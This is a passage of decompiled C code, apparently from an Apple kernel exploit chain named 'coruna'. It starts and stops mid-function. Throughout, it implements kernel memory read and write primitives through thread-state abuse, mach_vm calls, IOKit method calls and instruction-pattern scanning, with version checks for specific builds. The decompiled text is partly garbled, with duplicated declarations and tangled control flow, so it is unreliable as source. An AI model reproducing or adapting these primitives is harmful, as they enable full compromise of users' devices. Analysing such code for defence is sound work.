    host_info = 0;
    lk8 = _semaphore_create(*(task_t *)k_kernel_mach_task_self_slot,&host_info,0,0);
    if (lk8 == 0) {
      lppv15 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_semaphore_wait);
      status = _pthread_create(&thread_attr,(pthread_attr_t *)0x0,lppv15,(void *)(unsigned long)host_info);
      if ((((status == 0) && (lm9 = _pthread_mach_thread_np(thread_attr), 1 < lm9 + 1)) &&
          (handle = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(arg,lm9), handle != 0)) &&
         (type_id = coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6(arg,handle + (unsigned long)tag), tag = host_info, type_id != 0))
      goto exit_ok;
    }
    if (1 < host_info + 1) {
      _semaphore_signal(host_info);
      _semaphore_destroy(*(task_t *)ptr,host_info);
    }
    if (thread_attr != (pthread_t)0x0) {
      _pthread_join(thread_attr,(void **)0x0);
    }
  }
fail:
  if ((bootargs != 0) && (size != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,bootargs,size);
  }
  return;
}
void coruna_vm_map(long handle,vm_address_t *arg,vm_size_t arg_x,unsigned long arg_x_x)
{
  vm_inherit_t unaff_w29;
  
  if (1 < *(mem_entry_name_port_t *)(handle + 0x58) + 1) {
    _vm_map(*(vm_map_t *)k_kernel_mach_task_self_slot,arg,arg_x,0,1,
            *(mem_entry_name_port_t *)(handle + 0x58),
            arg_x_x & (*(unsigned long *)(handle + 0x188) ^ 0xffffffffffffffff),0,3,2,unaff_w29);
  }
  return;
}
void coruna_pthread_from_mach_thread_np_1cbd8(long handle)
{
  pthread_t p_Var1;
  vm_address_t address;
  
  if (1 < *(mach_port_t *)(handle + 0xac) + 1) {
    p_Var1 = _pthread_from_mach_thread_np(*(mach_port_t *)(handle + 0xac));
    if (1 < *(semaphore_t *)(handle + 0xd0) + 1) {
      _semaphore_signal(*(semaphore_t *)(handle + 0xd0));
      _semaphore_destroy(*(task_t *)k_kernel_mach_task_self_slot,*(semaphore_t *)(handle + 0xd0));
      *(uint32_t *)(handle + 0xd0) = 0;
    }
    if (p_Var1 != (pthread_t)0x0) {
      _pthread_join(p_Var1,(void **)0x0);
    }
    *(uint32_t *)(handle + 0xac) = 0;
  }
  address = *(vm_address_t *)(handle + 0xb0);
  if ((address != 0) && (*(vm_size_t *)(handle + 0xb8) != 0)) {
    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,*(vm_size_t *)(handle + 0xb8)
                  );
    *(vm_address_t *)(handle + 0xb0) = 0;
    *(uint64_t *)(handle + 0xb8) = 0;
  }
  *(uint64_t *)(handle + 200) = 0;
  if (1 < *(mach_port_name_t *)(handle + 0x58) + 1) {
    _mach_port_deallocate
              (*(ipc_space_t *)k_kernel_mach_task_self_slot,*(mach_port_name_t *)(handle + 0x58));
    *(uint32_t *)(handle + 0x58) = 0;
  }
  return;
}
void coruna_mach_port_deallocate_29404(long handle)
{
  int err;
  long handle;
  mach_port_name_t scratch;
  
  handle = *(long *)(&k_kernel_slot_1d48 + handle);
  if ((handle != 0) && (1 < *(int *)(handle + 0x70) + 1U)) {
    scratch = 0;
    err = coruna_ioconnectcallstructmethod(handle,&scratch);
    if (err == 0) {
      _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,scratch);
    }
    else {
      coruna_mach_port_deallocate_14398(handle,0x14,*(uint32_t *)(handle + 0x70));
    }
  }
  return;
}
void coruna_ioconnectcallstructmethod(uint64_t val,mach_port_name_t *arg)
{
  uint u;
  unsigned long size;
  uint64_t scratch;
  mach_port_name_t bootargs;
  uint64_t thread_attr;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t action;
  long serial_buf;
  
  serial_buf = *(long *)k_kernel_stack_chk_guard_slot;
  bootargs = 0;
  scratch = 0x40;
  size = coruna_mach_port_mod_refs(val,0x14,&bootargs);
  if ((int)size == 0) {
    host_info = 0;
    host_info = 0;
    action = 0;
    serial_buf = 0;
    scratch = 0;
    thread_attr = 0;
    thread_attr = 0;
    bootargs = 0;
    size = _IOConnectCallStructMethod(bootargs,1,0,0,&thread_attr,&scratch);
    if ((int)size == 0) {
      *arg = bootargs;
      bootargs = 0;
    }
  }
  if (1 < bootargs + 1) {
    u = _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
    size = (unsigned long)u;
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == serial_buf) {
    return;
  }
  ___stack_chk_fail(size);
}
void coruna_ioservicegetmatchingservice_295b8(long handle)
{
  uint32_t u;
  uint8_t *ptr;
  int err;
  uint size;
  long handle;
  long addr;
  uint64_t version;
  long off;
  unsigned long port;
  uint tag;
  long base;
  bool err;
  unsigned long scratch;
  mach_port_name_t bootargs;
  uint64_t thread_attr;
  long host_info;
  uint64_t serial_buf;
  long action;
  unsigned long block_ctx;
  unsigned long stack_guard;
  
  serial_buf = 0;
  action = 0;
  thread_attr = 0;
  host_info = 0;
  bootargs = 0;
  base = *(long *)(&k_kernel_slot_1d48 + handle);
  if (1 < bootargs + 1) {
  _mach_port_deallocate(*(ipc_space_t *)k_kernel_mach_task_self_slot,bootargs);
  }
  return;
}
void coruna_kernel509_residual_307(uint *size,uint64_t val,uint64_t *id_2)
{
  int err;
  uint64_t u;
  
  err = coruna_kernel509_via_mach_vm_read_overwrite_2();
  if (err != 0) {
    u = *id_2;
    if ((*size & 0x5584001) != 0) {
      u = coruna_kernel509_via_fn_ptr_cast_10_11(size);
    }
    *id_2 = u;
  }
  return;
}
void coruna_kernel509_residual_308(long handle,uint64_t val,uint64_t id_2)
{
  uint64_t scratch;
  
  scratch = id_2;
  coruna_kernel509_via_kernel509_via_kernel5_residual_237(handle,val,&scratch,*(uint32_t *)(handle + 0x168),1);
  return;
}
void coruna_pthread_mach_thread_np_29b88(byte *arg)
{
  uint u;
  mach_port_t lm2;
  int err;
  uint size;
  pthread_t p_Var5;
  void **lppv6;
  unsigned long version;
  __darwin_pthread_handler_rec *p_Var8;
  long handle;
  uint64_t port;
  pthread_t p_Var11;
  pthread_t *pp_Var12;
  pthread_t *pp_Var13;
  unsigned long tag;
  unsigned long scratch;
  pthread_t bootargs;
  long thread_attr;
  uint64_t host_info;
  uint64_t scratch;
  uint64_t serial_buf;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t action;
  uint64_t serial_buf;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t sa_saved;
  uint64_t sa_new;
  pthread_t stack_guard;
  long sa_saved;
  long sa_new;
  uint64_t path_buf;
  uint64_t path_buf;
  uint64_t tmp_buf;
  uint64_t region;
  uint64_t plist;
  uint64_t tmp_buf;
  uint64_t url_buf;
  uint64_t json_buf;
  uint64_t frame;
  uint64_t region;
  uint64_t work;
  uint64_t cache;
  uint64_t cache_20;
  long plist;
  
  tag = 0;
  plist = *(long *)k_kernel_stack_chk_guard_slot;
  scratch = 0;
  port = *(uint64_t *)k_kernel_vm_page_size_slot;
  work = 0;
  region = 0;
  cache_20 = 0;
  cache = 0;
  url_buf = 0;
  tmp_buf = 0;
  frame = 0;
  json_buf = 0;
  tmp_buf = 0;
  path_buf = 0;
  plist = 0;
  region = 0;
  sa_saved = 0;
  stack_guard = (pthread_t)0x0;
  path_buf = 0;
  sa_new = 0;
  stack_guard = 0;
  block_ctx = 0;
  sa_new = 0;
  sa_saved = 0;
  serial_buf = 0;
  action = 0;
  block_ctx = 0;
  action = 0;
  bootargs = 0;
  serial_buf = 0;
  host_info = 0;
  thread_attr = 0;
  size = 0x28008;
  thread_attr = 0;
  bootargs = (pthread_t)0x0;
  scratch = 0;
  host_info = 0;
  do {
    p_Var5 = _calloc(1,0x78);
    (&bootargs)[tag] = p_Var5;
    if (p_Var5 == (pthread_t)0x0) {
      size = 0xad009;
      goto fail;
    }
    lppv6 = (void **)coruna_kernel509_via_helper_5d2c_419fc(coruna_kernel509_residual_310);
    u = _pthread_create(&stack_guard + tag,(pthread_attr_t *)0x0,lppv6,p_Var5);
    if (u != 0) {
      p_Var5 = (pthread_t)0x0;
      size = -u;
      if (-1 < (int)u) {
        size = u;
      }
      size = size | 0x40000000;
done:
      if ((size == 0) && (*(pthread_t *)(arg + 0x1d48) = p_Var5, p_Var5 != (pthread_t)0x0)) {
      p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6_3(arg,p_Var5->__sig,1);
      p_Var5->__cleanup_stack = p_Var8;
      if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      err = coruna_vm_map_28574(arg,&scratch,port,p_Var8);
      if (err == 0) {
      *(unsigned long *)p_Var5->__opaque = scratch;
      *(uint64_t *)(p_Var5->__opaque + 8) = port;
      *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(arg + 0x188) & tag) + scratch;
      err = coruna_kernel5_via_ctx_clear_12bc4(arg,0);
      if ((err == 0) && (*(long *)(arg + 0x19f8) != 0)) {
      coruna_macho_text_sect(&stack_guard);
      thread_attr = sa_saved + sa_new + -0x20000;
      sa_new = 0x20000;
      bootargs = stack_guard;
      host_info = 0x20000;
      sa_saved = thread_attr;
      handle = coruna_strsep(&bootargs,"E8 0B 80 52",0,1);
      if (handle != 0) {
      size = coruna_kernel509_via_kernel5_residual_226(stack_guard,handle + -8);
      size = size >> 5 & 0xffff;
      if (size - 1 < 0xbff) {
      *(uint *)(p_Var5->__opaque + 0x28) = size;
      if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)) {
      err = coruna_fn_ptr_cast_10(arg,0x5584201);
      if (err != 0) {
      coruna_kernel509_via_fn_ptr_cast_2_15(arg,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60);
      }
      }
      else {
      coruna_vm_deallocate_39520(arg,p_Var5->__cleanup_stack,1,1,0x60);
      }
      }
      }
      }
      }
      }
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
      return;
      }
      ___stack_chk_fail();
    }
    lm2 = _pthread_mach_thread_np((&stack_guard)[tag]);
    if (lm2 + 1 < 2) {
fail:
      p_Var5 = (pthread_t)0x0;
      goto done;
    }
    *(mach_port_t *)(p_Var5->__opaque + 0x20) = lm2;
    if (p_Var5->__opaque[0x39] == '\0') {
      err = 0x3ea;
      do {
        err = err + -1;
        if (err == 0) {
          p_Var5 = (pthread_t)0x0;
          size = 0x1001;
          goto done;
        }
        _semaphore_timedwait(*(semaphore_t *)(arg + 0x264),(mach_timespec_t)0xf424000000000);
      } while (p_Var5->__opaque[0x39] == '\0');
    }
    version = coruna_kernel509_via_kernel509_via_fn_ptr_cast_2_4(arg,lm2);
    if (version == 0) {
      size = 0x28026;
      goto fail;
    }
    if (((version + 0x5f0 ^ version) & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) == 0) {
      size = 0;
      p_Var11 = (&stack_guard)[tag];
      (&bootargs)[tag] = (pthread_t)0x0;
      (&stack_guard)[tag] = (pthread_t)0x0;
      tag = (unsigned long)((int)tag + 1);
      p_Var5->__sig = version;
      *(pthread_t *)(p_Var5->__opaque + 0x18) = p_Var11;
      goto done;
    }
    tag = tag + 1;
  } while (tag != 0x10);
  p_Var5 = (pthread_t)0x0;
  size = 0xad011;
check_ok:
  pp_Var12 = &stack_guard;
  pp_Var13 = &bootargs;
  tag = tag & 0xffffffff;
  do {
    p_Var11 = *pp_Var13;
    if (((p_Var11 != (pthread_t)0x0) && (1 < *(int *)(p_Var11->__opaque + 0x20) + 1U)) &&
       (*pp_Var12 != (pthread_t)0x0)) {
      p_Var11->__opaque[0x38] = '\x01';
      ___ulock_wake(0x201,p_Var11->__opaque + 0x24);
      _pthread_join(*pp_Var12,(void **)0x0);
      *pp_Var12 = (pthread_t)0x0;
      _free(p_Var11);
      *pp_Var13 = (pthread_t)0x0;
    }
    pp_Var12 = pp_Var12 + 1;
    pp_Var13 = pp_Var13 + 1;
    tag = tag - 1;
  } while (tag != 0);
cleanup:
  if ((size == 0) && (*(pthread_t *)(arg + 0x1d48) = p_Var5, p_Var5 != (pthread_t)0x0)) {
    p_Var8 = (__darwin_pthread_handler_rec *)coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6_3(arg,p_Var5->__sig,1);
    p_Var5->__cleanup_stack = p_Var8;
    if (p_Var8 != (__darwin_pthread_handler_rec *)0x0) {
      tag = p_Var5->__sig;
      err = coruna_vm_map_28574(arg,&scratch,port,p_Var8);
      if (err == 0) {
        *(unsigned long *)p_Var5->__opaque = scratch;
        *(uint64_t *)(p_Var5->__opaque + 8) = port;
        *(unsigned long *)(p_Var5->__opaque + 0x10) = (*(unsigned long *)(arg + 0x188) & tag) + scratch;
        err = coruna_kernel5_via_ctx_clear_12bc4(arg,0);
        if ((err == 0) && (*(long *)(arg + 0x19f8) != 0)) {
          coruna_macho_text_sect(&stack_guard);
          thread_attr = sa_saved + sa_new + -0x20000;
          sa_new = 0x20000;
          bootargs = stack_guard;
          host_info = 0x20000;
          sa_saved = thread_attr;
          handle = coruna_strsep(&bootargs,"E8 0B 80 52",0,1);
          if (handle != 0) {
            size = coruna_kernel509_via_kernel5_residual_226(stack_guard,handle + -8);
            size = size >> 5 & 0xffff;
            if (size - 1 < 0xbff) {
              *(uint *)(p_Var5->__opaque + 0x28) = size;
              if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)) {
                err = coruna_fn_ptr_cast_10(arg,0x5584201);
                if (err != 0) {
                  coruna_kernel509_via_fn_ptr_cast_2_15(arg,*(uint64_t *)(p_Var5->__opaque + 0x10),1,1,0x60);
                }
              }
              else {
                coruna_vm_deallocate_39520(arg,p_Var5->__cleanup_stack,1,1,0x60);
              }
            }
          }
        }
      }
    }
  }
  if (*(long *)k_kernel_stack_chk_guard_slot == plist) {
    return;
  }
  ___stack_chk_fail();
}
void coruna_kernel509_via_kernel509_via_fn_ptr_cast_10_6_3(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  uint64_t scratch;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t bootargs;
  
  bootargs = 0;
  scratch = 0;
  scratch = 0;
  thread_attr = 0;
  bootargs = 0;
  coruna_kernel509_via_fn_ptr_cast_10_6(val,id_2,&scratch,size_3);
  return;
}
void coruna_vm_deallocate_1cda0(long handle)
{
  vm_address_t address;
  uint64_t *ptr;
  
  ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
  if (ptr != (uint64_t *)0x0) {
    address = ptr[2];
    if ((address != 0) && (ptr[3] != 0)) {
      _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,address,ptr[3]);
      ptr[2] = 0;
      ptr[3] = 0;
      ptr = *(uint64_t **)(&k_kernel_slot_1d48 + handle);
      if (ptr == (uint64_t *)0x0) {
        return;
      }
    }
    *(uint64_t *)(&k_kernel_slot_1d48 + handle) = 0;
    *(uint8_t *)(ptr + 9) = 1;
    ___ulock_wake(0x201,(long)ptr + 0x34,*(uint32_t *)(ptr + 6));
    _pthread_join((pthread_t)ptr[5],(void **)0x0);
    ptr[1] = 0;
    *ptr = 0;
    ptr[3] = 0;
    ptr[2] = 0;
    ptr[5] = 0;
    ptr[4] = 0;
    ptr[7] = 0;
    ptr[6] = 0;
    ptr[9] = 0;
    ptr[8] = 0;
    ptr[0xb] = 0;
    ptr[10] = 0;
    ptr[0xd] = 0;
    ptr[0xc] = 0;
    ptr[0xe] = 0;
    _free(ptr);
  }
  return;
}
void coruna_mach_vm_machine_attribute(long handle,mach_vm_address_t arg,uint32_t size)
{
  uint32_t scratch;
  vm_machine_attribute_val_t bootargs;
  
  scratch = size;
  if (*(long *)(handle + 0x40) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(handle,arg,&scratch,4,1);
  }
  if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
    if ((*(int *)(handle + 0xe8) + 1U < 2) ||
       ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_1bf8c(handle,arg,&scratch,4,1);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel509_via_kernel5_residual_237(handle,arg,&scratch,4,1);
          return;
        }
      }
      _mach_vm_write(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,(vm_offset_t)&scratch,4);
      bootargs = 7;
      _mach_vm_machine_attribute(*(vm_map_t *)(&k_kernel_slot_1918 + handle),arg,4,1,&bootargs);
    }
    else {
      coruna_ioconnectcallmethod_1c8a8(handle,arg,&scratch,4,1);
    }
  }
  else {
    coruna_thread_switch_2a2c8(handle,arg,&scratch,4,1);
  }
  return;
}
void coruna_thread_switch_2a2c8(byte *arg,unsigned long arg_x,long handle,uint size,int flags)
{
  long handle;
  unsigned long *ptr;
  size_t ls3;
  int err;
  int status;
  int flags;
  uint u;
  long addr;
  long off;
  uint *buf;
  uint size;
  unsigned long version;
  long base;
  unsigned long port;
  long ctx_val;
  vm_size_t size;
  uint tag;
  unsigned long kind;
  unsigned long type_id;
  long serial;
  uint type_id_8;
  int scratch;
  int bootargs;
  int thread_attr;
  uint32_t host_info;
  unsigned long serial_buf;
  unsigned long action;
  vm_address_t block_ctx;
  unsigned long stack_guard;
  
  if (*(long *)(arg + 0x1d48) == 0) {
    return;
  }
  if ((((arg_x & 3) == 0) && (size == 4)) ||
     (*(char *)(*(long *)(arg + 0x1d48) + 0x4a) == '\0')) {
    addr = coruna_kernel5_residual_225(arg,arg_x);
    if (addr == 0) {
      return;
    }
    bootargs = -1;
    if ((flags != 0) && (err = coruna_open_dev_null(&bootargs), err != 0)) {
      return;
    }
    err = bootargs;
    if (size != 0) {
      type_id_8 = 0;
fail:
      u = size - type_id_8;
      scratch = 0;
      addr = arg_x + type_id_8;
      if (u < 4) {
        tag = 0;
        if ((((addr + (unsigned long)u) - 1 ^ addr + 3U) &
            (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff)) != 0) {
          tag = 4 - u;
        }
      }
      else {
        tag = 0;
      }
      type_id = addr - (unsigned long)tag;
      status = coruna_thread_get_state(arg,type_id,&scratch,4,0);
      flags = scratch;
      err = bootargs;
      if (status == 0) {
        ls3 = 4 - (unsigned long)tag;
        if ((unsigned long)u <= 4 - (unsigned long)tag) {
          ls3 = (unsigned long)u;
        }
        _memcpy((void *)((long)&scratch + (unsigned long)tag),(void *)(handle + (unsigned long)type_id_8),ls3);
        err = scratch;
        if (flags != scratch) {
          block_ctx = 0;
          size = *(vm_size_t *)k_kernel_vm_page_size_slot;
          stack_guard = type_id;
          flags = coruna_fn_ptr_cast_10(arg,0x4000000);
          if (flags == 0) {
            flags = coruna_fn_ptr_cast_10(arg,0x5584201);
            addr = 0xd8;
            if (flags != 0) {
              addr = 0x90;
            }
          }
          else {
            addr = 0xe0;
          }
          serial = *(long *)(arg + 0x1d48);
          u = 0xad001;
          if (serial != 0) {
            u = 0xad001;
            if (*(int *)(serial + 0x38) != 0) {
              base = *(long *)(serial + 8);
              u = 0xad001;
              if (base != 0) {
                port = (unsigned long)(*(int *)(serial + 0x38) + 0x60);
                ctx_val = *(long *)(serial + 0x20);
                handle = base + port;
                ptr = (unsigned long *)(ctx_val + port);
                flags = 0xb;
                do {
                  if (flags != 0xb) {
                    _thread_switch(*(mach_port_name_t *)(serial + 0x30),2,10);
                  }
                  if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)
                     ) {
                    action = *ptr;
                    off = coruna_fn_ptr_cast_2(arg);
                    if (off != 0) {
                      serial_buf = *(unsigned long *)(ctx_val + addr);
                      goto done;
                    }
                  }
                  else {
                    action = 0;
                    u = coruna_kernel509_via_mach_port_deallocate_2b24c_2(arg,handle,&action,*(uint32_t *)(arg + 0x168),0)
                    ;
                    if (block_ctx != 0 && size != 0) {
                    _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,block_ctx,size);
                    }
                    err = bootargs;
                    continue;
                  }
                  flags = flags + -1;
                } while (flags != 0);
                u = 0x28026;
              }
            }
          }
          if (block_ctx != 0 && size != 0) {
          _vm_deallocate(*(vm_map_t *)k_kernel_mach_task_self_slot,block_ctx,size);
          }
          err = bootargs;
          continue;
        }
        goto skip;
      }
    }
  }
  else {
    if (*(int *)(arg + 0xac) + 1U < 2) {
      return;
    }
    if (*(long *)(arg + 0xd8) == 0) {
      return;
    }
    addr = coruna_kernel5_residual_225(arg,arg_x);
    if (addr == 0) {
      return;
    }
    block_ctx = coruna_u64_pack((block_ctx), (0xffffffff));
    if ((flags != 0) && (err = coruna_open_dev_null(&block_ctx), err != 0)) {
      return;
    }
    if (size != 0) {
      type_id = 0;
      while( true ) {
        stack_guard = 0;
        type_id_8 = (uint)(arg_x + type_id) & 7;
        kind = (unsigned long)type_id_8;
        addr = (arg_x + type_id) - kind;
        err = coruna_thread_get_state(arg,addr,&stack_guard,8,0);
        port = stack_guard;
        if (err != 0) break;
        version = (unsigned long)(size - (int)type_id);
        ls3 = 8 - kind;
        if (version <= 8 - kind) {
          ls3 = version;
        }
        _memcpy((void *)((unsigned long)&stack_guard | kind),(void *)(handle + type_id),ls3);
        if (((port != stack_guard) && (err = coruna_ioconnectcallscalarmethod_2c778(arg,addr), err != 0)) ||
           (type_id_8 = ((int)type_id - type_id_8) + 8, type_id = (unsigned long)type_id_8, size <= type_id_8)) break;
      }
    }
    err = (int)block_ctx;
  }
next:
  if (err != -1) {
    coruna_close();
  }
  return;
}
void coruna_kernel509_via_mach_vm_read_overwrite(long handle,uint64_t val,uint64_t id_2)
{
  uint8_t scratch[8];
  
  if (*(long *)(handle + 0x30) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(handle,val,id_2,4,1);
  }
  if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
    if ((*(int *)(handle + 0xe8) + 1U < 2) ||
       ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
      if ((*(int *)(&k_kernel_slot_1930 + handle) != -1) && (*(int *)(&k_kernel_slot_1934 + handle) != -1)) {
        if ((*(int *)(&k_kernel_slot_1940 + handle) != -1) && (*(long *)(handle + 0x218) != 0)) {
          coruna_fcntl_26e9c(handle,val,id_2,4,1);
          return;
        }
        if ((*(int *)(&k_kernel_slot_1938 + handle) != -1) && (*(int *)(&k_kernel_slot_193c + handle) != -1))
        {
          coruna_kernel509_via_kernel5_residual_238(handle,val,id_2,4,1);
          return;
        }
      }
      coruna_mach_vm_read_overwrite(*(uint32_t *)(&k_kernel_slot_1918 + handle),val,4,
                   *(uint32_t *)(handle + 0x178),id_2,scratch);
    }
    else {
      coruna_ioconnectcallmethod_27ef0(handle,val,id_2,4,1);
    }
  }
  else {
    coruna_thread_get_state(handle,val,id_2,4,1);
  }
  return;
}
void coruna_thread_get_state(byte *arg,long handle,long addr_2,uint size,int flags)
{
  unsigned long u;
  unsigned long size;
  void *ptr;
  uint version;
  int err;
  uint port;
  uint tag;
  long handle;
  uint kind;
  unsigned long type_id;
  unsigned long type_id_8;
  unsigned long type_id_9;
  uint type_id_10;
  uint64_t type_id_11;
  unsigned long type_id_12;
  size_t ls16;
  int scratch;
  mach_msg_type_number_t bootargs;
  natural_t thread_attr [134];
  long host_info;
  uint64_t serial_buf[2];
  
  if ((((1 < *(int *)(arg + 0xac) + 1U) && (*(long *)(arg + 0xd8) != 0)) &&
      (handle = coruna_kernel5_residual_225(arg), handle != 0)) &&
     ((scratch = -1, flags == 0 || (err = coruna_open_dev_null(&scratch), err == 0)))) {
    if (size != 0) {
      kind = 0;
      do {
        type_id_10 = size - kind;
        u = handle + (unsigned long)kind;
        if ((((*(unsigned long *)(arg + 0x188) & u) == 0) && (0x3fff < type_id_10)) &&
           (err = coruna_uuid_is_null(arg), err != 0)) {
          port = 0x80000;
          if (*(unsigned long *)(arg + 0x158) < 0x1f530f02800000) {
            port = 0x4000;
          }
          version = 0x210;
          if (*(unsigned long *)(arg + 0x158) < 0x27120000000000) {
            version = port;
          }
          if (version <= type_id_10) {
            type_id_10 = version;
          }
          port = coruna_task_map_corpse_info_64(arg,u,addr_2 + (unsigned long)kind,type_id_10);
fail:
          if (port != 0) break;
        }
        else {
          if (0x20f < type_id_10) {
            type_id_10 = 0x210;
          }
          if ((*(int *)(arg + 0xac) + 1U < 2) || (*(long *)(arg + 0xd8) == 0)) break;
          if (type_id_10 != 0) {
            type_id_8 = 0;
            ls16 = 0;
            do {
              size = type_id_8 + u;
              ptr = (void *)(type_id_8 + addr_2 + (unsigned long)kind);
              type_id_9 = type_id_10 - type_id_8;
              if ((*(unsigned long *)(arg + 0x158) < 0x27120f04b00003) || ((*arg >> 5 & 1) == 0)) {
                serial_buf[0] = coruna_u64_pack((serial_buf[0]), (0x84));
                type_id = *(unsigned long *)(arg + 0x188) & size;
                if ((unsigned long)*(uint *)(arg + 0x180) - 0x210 <= type_id) {
                  type_id = (unsigned long)*(uint *)(arg + 0x180) - 0x210;
                }
                handle = type_id + (size & (*(unsigned long *)(arg + 0x188) ^ 0xffffffffffffffff));
                type_id_11 = **(uint64_t **)(arg + 200);
                DataSynchronizationBarrier(2,3,0);
                **(long **)(arg + 200) = handle + -0x10;
                port = _thread_get_state(*(thread_act_t *)(arg + 0xac),0x11,thread_attr,
                                          (mach_msg_type_number_t *)serial_buf);
                if (port == 0) {
                  if ((mach_msg_type_number_t)serial_buf[0] == 0x84) {
                    type_id = (handle - size) + 0x210;
                    ls16 = type_id_9;
                    if (type_id <= type_id_9) {
                      ls16 = type_id;
                    }
                    _memcpy(ptr,(void *)((long)thread_attr + (size - handle)),ls16);
                    port = 0;
                  }
                  else {
                    port = 0xad022;
                  }
                }
                else {
                  port = port | 0x80000000;
                }
                **(uint64_t **)(arg + 200) = type_id_11;
              }
              else {
                serial_buf[0] = 0;
                bootargs = 0x84;
                type_id_12 = *(unsigned long *)(arg + 0x188);
                type_id = type_id_12 & size;
                if ((unsigned long)*(uint *)(arg + 0x180) - 0x210 <= type_id) {
                  type_id = (unsigned long)*(uint *)(arg + 0x180) - 0x210;
                }
                handle = coruna_fn_ptr_cast_2(arg,*(uint64_t *)(arg + 0xe0));
                if (handle == 0) {
                  port = coruna_kernel509_via_mach_port_deallocate_2b24c_2(arg,*(uint64_t *)(arg + 0xd8),serial_buf,8,0);
                  if (port != 0) goto done;
                  *(uint64_t *)(arg + 0xe0) = serial_buf[0];
                }
                else {
                  serial_buf[0] = *(uint64_t *)(arg + 0xe0);
                }
                handle = type_id + (size & (type_id_12 ^ 0xffffffffffffffff));
                DataSynchronizationBarrier(2,3,0);
                host_info = handle + -0x10;
                port = coruna_kernel509_via_mach_port_deallocate_2b24c_3(arg,*(uint64_t *)(arg + 0xd8),&host_info,8,0);
                if (port == 0) {
                  port = _thread_get_state(*(thread_act_t *)(arg + 0xac),0x11,thread_attr,
                                            &bootargs);
                  if (port == 0) {
                    if (bootargs == 0x84) {
                      type_id = (handle - size) + 0x210;
                      ls16 = type_id_9;
                      if (type_id <= type_id_9) {
                        ls16 = type_id;
                      }
                      _memcpy(ptr,(void *)((long)thread_attr + (size - handle)),ls16);
                      port = 0;
                    }
                    else {
                      port = 0xad022;
                    }
                  }
                  else {
                    port = port | 0x80000000;
                  }
                  tag = coruna_kernel509_via_mach_port_deallocate_2b24c_3(arg,*(uint64_t *)(arg + 0xd8),serial_buf,8,0);
                  version = tag;
                  if (port != 0) {
                    version = port;
                  }
                  if (tag != 0) {
                    port = version;
                  }
                }
              }
done:
            } while ((port == 0) && (type_id_8 = ls16 + type_id_8, type_id_8 < type_id_10));
            if (port != 0) break;
          }
        }
        kind = type_id_10 + kind;
      } while (kind < size);
    }
    if (scratch != -1) {
      coruna_close();
    }
  }
  return;
}
void coruna_mach_vm_read_overwrite(vm_map_t arg,long handle,unsigned long arg_x,unsigned long arg,long addr_2,
                 unsigned long *val)
{
  unsigned long u;
  mach_vm_size_t size;
  kern_return_t lk2;
  unsigned long size;
  unsigned long scratch;
  
  if (arg_x != 0) {
    size = 0;
    u = arg_x;
    if (arg != 0) {
      u = arg;
    }
    do {
      size = arg_x;
      if (u <= arg_x) {
        size = u;
      }
      scratch = arg_x;
      lk2 = _mach_vm_read_overwrite(arg,size + handle,size,size + addr_2,&scratch);
      if (lk2 != 0) {
        return;
      }
      size = (unsigned long)(uint)((int)scratch + (int)size);
      arg_x = arg_x - scratch;
    } while (arg_x != 0);
    if (val != (unsigned long *)0x0) {
      *val = size;
    }
  }
  return;
}
void coruna_kernel509_via_mach_vm_read_overwrite_2(long handle,uint64_t val,uint64_t *id_2)
{
  uint8_t scratch[8];
  
  *id_2 = 0;
  if (*(long *)(handle + 0x30) != 0) {
    coruna_kernel509_via_helper_5d2c_419fc_2(handle,val,id_2,*(uint32_t *)(handle + 0x168),1);
  }
  if ((*(int *)(handle + 0xac) + 1U < 2) || (*(long *)(handle + 0xd8) == 0)) {
    if ((*(int *)(handle + 0xe8) + 1U < 2) ||
       ((*(long *)(handle + 0xf8) == 0 || (*(long *)(handle + 0x100) == 0)))) {
